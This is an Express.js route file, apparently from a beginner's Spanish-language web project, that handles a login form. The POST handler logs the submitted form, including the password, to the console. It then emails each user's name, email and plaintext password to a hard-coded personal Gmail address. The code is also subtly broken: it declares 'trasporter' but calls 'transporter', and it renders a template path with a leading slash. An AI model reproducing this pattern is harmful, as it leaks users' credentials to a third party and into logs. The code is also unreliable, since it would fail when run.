var express = require('express');
var router = express.Router();

var nodemailer = require('nodemailer')

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('iniciosesion');
});

router.post('/', async (req, res, next) => {
  var nombre = req.body.nombre;
  var apellido = req.body.apellido;
  var email = req.body.email;
  var contraseña = req.body.contraseña;

  console.log(req.body)

  var obj = {
    to: 'borrothiago@gmail.com',
    subject: 'Inicio de Sesión',
    html: nombre + " " + apellido + " inicio sesión conrrectamente, con los siguiente datos: " + email + ", contraseña: " + contraseña + "."
  }

  var trasporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    }
  })

  var info = await transporter.sendMail(obj);

  res.render("/iniciosesion", {
    message: "Sesión Iniciada Correctamente",
  });

});
module.exports = router;
